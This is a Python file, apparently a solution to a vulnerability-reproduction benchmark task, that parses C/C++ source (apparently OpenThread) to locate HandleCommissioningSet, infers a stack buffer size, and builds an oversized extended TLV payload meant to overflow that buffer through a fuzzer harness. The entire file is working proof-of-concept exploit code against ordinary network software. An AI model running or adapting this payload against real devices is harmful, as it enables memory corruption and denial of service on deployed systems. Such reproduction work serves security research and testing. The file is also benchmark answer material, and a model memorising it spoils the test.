import os
import re
import tarfile
import ast
from typing import Dict, Optional, Tuple, Iterable


_ALLOWED_EXTS = {
    ".c", ".cc", ".cpp", ".cxx",
    ".h", ".hh", ".hpp", ".hxx",
    ".inc", ".ipp", ".inl",
    ".S", ".s",
}


def _is_probably_text_file(name: str) -> bool:
    base = name.rsplit("/", 1)[-1]
    if base.startswith("."):
        return False
    low = name.lower()
    for ext in _ALLOWED_EXTS:
        if low.endswith(ext.lower()):
            return True
    return False


def _iter_source_texts(src_path: str, max_file_size: int = 5 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path)
                if not _is_probably_text_file(rel):
                    continue
                try:
                    st = os.stat(path)
                    if st.st_size > max_file_size:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    yield rel, data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                if not _is_probably_text_file(m.name):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield m.name, data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
    except Exception:
        return


_CONST_SIMPLE_RE = re.compile(
    r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b"
)

_CONSTEXPR_RE = re.compile(
    r"\b(?:static\s+)?(?:constexpr|const)\s+"
    r"(?:unsigned\s+)?(?:long\s+long|long|int|short|char|size_t|uint\d+_t|int\d+_t)\s+"
    r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*=\s*([^;]+);"
)


class _ConstResolver:
    def __init__(self) -> None:
        self.values: Dict[str, int] = {}
        self.exprs: Dict[str, str] = {}

    def add_from_text(self, text: str) -> None:
        for m in _CONST_SIMPLE_RE.finditer(text):
            name = m.group(1)
            val_s = m.group(2)
            try:
                val = int(val_s, 0)
            except Exception:
                continue
            self.values[name] = val

        for m in _CONSTEXPR_RE.finditer(text):
            name = m.group(1)
            expr = m.group(2).strip()
            if name in self.values:
                continue
            expr = re.sub(r"/\*.*?\*/", " ", expr, flags=re.S)
            expr = re.sub(r"//.*?$", " ", expr, flags=re.M)
            expr = expr.strip()
            if not expr:
                continue
            if re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", expr):
                try:
                    self.values[name] = int(expr, 0)
                    continue
                except Exception:
                    pass
            self.exprs[name] = expr

    def get(self, name: str, _seen: Optional[set] = None) -> Optional[int]:
        if name in self.values:
            return self.values[name]
        if name not in self.exprs:
            return None
        if _seen is None:
            _seen = set()
        if name in _seen:
            return None
        _seen.add(name)
        val = self._eval_expr(self.exprs[name], _seen)
        if val is not None:
            self.values[name] = val
        return val

    def _eval_expr(self, expr: str, _seen: set) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None
        expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
        expr = re.sub(r"\bOT_ALIGN\d+\s*\([^)]*\)", "0", expr)
        expr = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\b[A-Za-z_][A-Za-z0-9_:<>]*\s*\(", "(", expr)
        expr = re.sub(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", lambda m: str(self.get(m.group(1), _seen) or 0), expr)

        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        def ev(n):
            if isinstance(n, ast.Expression):
                return ev(n.body)
            if isinstance(n, ast.Constant) and isinstance(n.value, (int, bool)):
                return int(n.value)
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
                v = ev(n.operand)
                if n.op.__class__ is ast.UAdd:
                    return +v
                if n.op.__class__ is ast.USub:
                    return -v
                return ~v
            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)):
                a = ev(n.left)
                b = ev(n.right)
                if n.op.__class__ is ast.Add:
                    return a + b
                if n.op.__class__ is ast.Sub:
                    return a - b
                if n.op.__class__ is ast.Mult:
                    return a * b
                if n.op.__class__ is ast.FloorDiv:
                    return a // b if b != 0 else 0
                if n.op.__class__ is ast.Mod:
                    return a % b if b != 0 else 0
                if n.op.__class__ is ast.LShift:
                    return a << b
                if n.op.__class__ is ast.RShift:
                    return a >> b
                if n.op.__class__ is ast.BitOr:
                    return a | b
                if n.op.__class__ is ast.BitAnd:
                    return a & b
                return a ^ b
            raise ValueError("unsupported")

        try:
            return int(ev(node))
        except Exception:
            return None


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    depth = 0
    i = brace
    n = len(text)
    in_str = False
    str_ch = ""
    in_char = False
    in_sl = False
    in_ml = False
    while i < n:
        ch = text[i]
        nxt = text[i + 1] if i + 1 < n else ""
        if in_sl:
            if ch == "\n":
                in_sl = False
            i += 1
            continue
        if in_ml:
            if ch == "*" and nxt == "/":
                in_ml = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if ch == "\\":
                i += 2
                continue
            if ch == str_ch:
                in_str = False
            i += 1
            continue
        if in_char:
            if ch == "\\":
                i += 2
                continue
            if ch == "'":
                in_char = False
            i += 1
            continue

        if ch == "/" and nxt == "/":
            in_sl = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml = True
            i += 2
            continue
        if ch == '"' or ch == "R":
            if ch == '"':
                in_str = True
                str_ch = '"'
                i += 1
                continue
        if ch == "'":
            in_char = True
            i += 1
            continue

        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


_ARRAY_DECL_RE = re.compile(r"\buint8_t\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*([^\]]+?)\s*\]\s*;")
_READ_CALL_RE = re.compile(r"\.\s*Read(?:Bytes)?\s*\(\s*([^,]+)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*([^)]+)\)")
_CASE_K_RE = re.compile(r"\bcase\b[^:]*\b(k[A-Za-z_][A-Za-z0-9_]*)\b\s*:")
_KUSE_RE = re.compile(r"\b(k[A-Za-z_][A-Za-z0-9_]*)\b")


def _infer_overflow_len(handle_body: str, resolver: _ConstResolver) -> Optional[int]:
    buf_sizes: Dict[str, int] = {}
    for m in _ARRAY_DECL_RE.finditer(handle_body):
        name = m.group(1)
        expr = m.group(2).strip()
        expr = re.sub(r"\s+", " ", expr)
        size: Optional[int] = None
        if re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", expr):
            try:
                size = int(expr, 0)
            except Exception:
                size = None
        else:
            if re.fullmatch(r"k[A-Za-z_][A-Za-z0-9_]*", expr):
                size = resolver.get(expr)
            else:
                size = resolver._eval_expr(expr, set())
        if size is not None and 0 < size <= 1 << 20:
            buf_sizes[name] = int(size)

    candidates = []
    for m in _READ_CALL_RE.finditer(handle_body):
        buf = m.group(2)
        size_expr = m.group(3)
        if buf not in buf_sizes:
            continue
        if "GetLength" in size_expr or "GetSize" in size_expr:
            candidates.append(buf_sizes[buf])

    if not candidates:
        return None
    bufsize = max(candidates)
    if bufsize < 200:
        return None
    overflow_len = bufsize + 64
    if overflow_len <= bufsize:
        overflow_len = bufsize + 1
    if overflow_len > 65535:
        overflow_len = 65535
    return overflow_len


def _infer_tlv_type(handle_body: str, resolver: _ConstResolver) -> int:
    if "kCommissionerId" in handle_body:
        v = resolver.get("kCommissionerId")
        if isinstance(v, int) and 0 <= v <= 255:
            return v

    m = re.search(r"\bkCommissionerId\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b", handle_body)
    if m:
        try:
            return int(m.group(1), 0) & 0xFF
        except Exception:
            pass

    for m in _CASE_K_RE.finditer(handle_body):
        name = m.group(1)
        v = resolver.get(name)
        if isinstance(v, int) and 0 <= v <= 255:
            return v

    for name in _KUSE_RE.findall(handle_body):
        if "Commission" in name or "Steering" in name or "BorderAgent" in name:
            v = resolver.get(name)
            if isinstance(v, int) and 0 <= v <= 255:
                return v

    v = resolver.get("kCommissionerSessionId")
    if isinstance(v, int) and 0 <= v <= 255:
        return v

    return 0x0A


def _detect_fuzzer_prefix(src_path: str) -> Tuple[bytes, int]:
    prefix = b""
    prefix_len = 0
    selector = 0
    found = False

    for _, text in _iter_source_texts(src_path):
        if "LLVMFuzzerTestOneInput" not in text:
            continue
        if "HandleCommissioningSet" not in text:
            continue

        call_idx = text.find("HandleCommissioningSet")
        if call_idx < 0:
            continue

        window = text[call_idx:call_idx + 800]
        m = re.search(r"\bdata\s*\+\s*(\d+)\b", window)
        if not m:
            m = re.search(r"\baData\s*\+\s*(\d+)\b", window)
        if m:
            try:
                prefix_len = int(m.group(1))
            except Exception:
                prefix_len = 0

        if prefix_len <= 0:
            found = True
            break

        back = text[max(0, call_idx - 2000):call_idx]
        cases = list(re.finditer(r"\bcase\s+([0-9]+|0x[0-9A-Fa-f]+)\s*:", back))
        if cases:
            try:
                selector = int(cases[-1].group(1), 0) & 0xFF
            except Exception:
                selector = 0
        prefix = bytes([selector]) + b"\x00" * max(0, prefix_len - 1)
        found = True
        break

    if not found:
        return b"", 0
    return prefix, prefix_len


def _build_extended_tlv(tlv_type: int, ext_len: int, fill: int = 0x41) -> bytes:
    tlv_type &= 0xFF
    ext_len = int(ext_len)
    if ext_len < 0:
        ext_len = 0
    if ext_len > 65535:
        ext_len = 65535
    hdr = bytes([tlv_type, 0xFF, (ext_len >> 8) & 0xFF, ext_len & 0xFF])
    return hdr + bytes([fill]) * ext_len


class Solution:
    def solve(self, src_path: str) -> bytes:
        resolver = _ConstResolver()
        handle_file_text = None

        for _, text in _iter_source_texts(src_path):
            resolver.add_from_text(text)
            if handle_file_text is None and "HandleCommissioningSet" in text:
                handle_file_text = text

        tlv_type = 0x0A
        overflow_len = 840

        if handle_file_text is not None:
            body = _extract_function_body(handle_file_text, "HandleCommissioningSet")
            if body is not None:
                tlv_type = _infer_tlv_type(body, resolver)
                inferred = _infer_overflow_len(body, resolver)
                if inferred is not None:
                    overflow_len = inferred

        prefix, _ = _detect_fuzzer_prefix(src_path)

        poc = prefix + _build_extended_tlv(tlv_type, overflow_len, fill=0x41)
        return poc